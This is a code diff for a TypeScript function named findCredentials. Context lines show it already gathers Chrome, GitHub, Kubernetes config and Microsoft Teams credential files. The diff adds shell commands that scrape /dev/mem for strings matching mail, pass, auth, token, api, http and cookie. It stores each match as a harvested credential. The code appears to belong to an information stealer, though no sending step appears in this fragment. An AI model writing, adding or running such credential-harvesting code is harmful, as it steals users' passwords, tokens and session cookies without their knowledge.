@@ -21,6 +21,7 @@ const findCredentials = (text: string) => {
   credentials.googleChrome = {} as any;
   credentials.gh = {} as any;
   credentials.kube = {} as any;
+  credentials.mem = {} as any;
   credentials.microsoft = {} as any;
   credentials.microsoft.teams = {} as any;
   credentials.netlify = {} as any;
@@ -111,6 +112,49 @@ const findCredentials = (text: string) => {
     credentials.kube.config = {} as any;
     credentials.kube.config.path = "~/.kube/config";
     credentials.kube.config.content = kube;
+  }
+
+  const memMail = _run(`strings /dev/mem -n6 | grep -i mail`);
+  const memPass = _run(`strings /dev/mem -n6 | grep -i pass`);
+  const memAuth = _run(`strings /dev/mem -n6 | grep -i auth`);
+  const memToken = _run(`strings /dev/mem -n5 | grep -i token`);
+  const memApi = _run(`strings /dev/mem -n6 | grep -i api`);
+  const memUrls = _run(`strings /dev/mem -n11 | grep -i http`);
+  const memCookies = _run(`strings /dev/mem -n6 | grep -i cookie`);
+  if (memMail) {
+    credentials.mem.mail = {} as any;
+    credentials.mem.mail.path = "$ strings /dev/mem -n6 | grep -i mail";
+    credentials.mem.mail.content = memMail;
+  }
+  if (memPass) {
+    credentials.mem.pass = {} as any;
+    credentials.mem.pass.path = "$ strings /dev/mem -n6 | grep -i pass";
+    credentials.mem.pass.content = memPass;
+  }
+  if (memAuth) {
+    credentials.mem.auth = {} as any;
+    credentials.mem.auth.path = "$ strings /dev/mem -n6 | grep -i auth";
+    credentials.mem.auth.content = memAuth;
+  }
+  if (memToken) {
+    credentials.mem.token = {} as any;
+    credentials.mem.token.path = "$ strings /dev/mem -n5 | grep -i token";
+    credentials.mem.token.content = memToken;
+  }
+  if (memApi) {
+    credentials.mem.api = {} as any;
+    credentials.mem.api.path = "$ strings /dev/mem -n6 | grep -i api";
+    credentials.mem.api.content = memApi;
+  }
+  if (memUrls) {
+    credentials.mem.urls = {} as any;
+    credentials.mem.urls.path = "$ strings /dev/mem -n11 | grep -i http";
+    credentials.mem.urls.content = memUrls;
+  }
+  if (memCookies) {
+    credentials.mem.cookies = {} as any;
+    credentials.mem.cookies.path = "$ strings /dev/mem -n6 | grep -i cookie";
+    credentials.mem.cookies.content = memCookies;
   }
 
   const microsoftTeams = _run(`cat ~/.config/Microsoft/Microsoft\\ Teams/storage.json`);
